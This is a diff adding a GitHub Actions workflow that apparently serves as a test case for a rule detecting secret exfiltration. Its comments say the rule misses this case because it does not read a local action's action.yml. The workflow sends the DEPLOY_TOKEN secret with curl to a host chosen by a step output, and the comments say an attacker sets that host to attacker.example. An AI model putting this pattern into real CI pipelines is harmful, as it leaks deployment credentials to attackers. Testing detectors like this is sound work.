@@ -1,0 +1,19 @@
+# situation: the step s uses a local action, and a step sends a request with
+#   curl and the secret DEPLOY_TOKEN to the host steps.s.outputs.o names.
+# reason: the output is what the local action gives, which is not read here.
+# cause: the rule does not read the action.yml of a local action.
+# attack: the attacker makes the value attacker.example, where the value
+#   comes from what the attacker writes.
+# attack-run-behavior: curl sends the request with the secret to
+#   attacker.example.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - id: s
+        uses: ./.github/actions/a
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ steps.s.outputs.o }}/status"
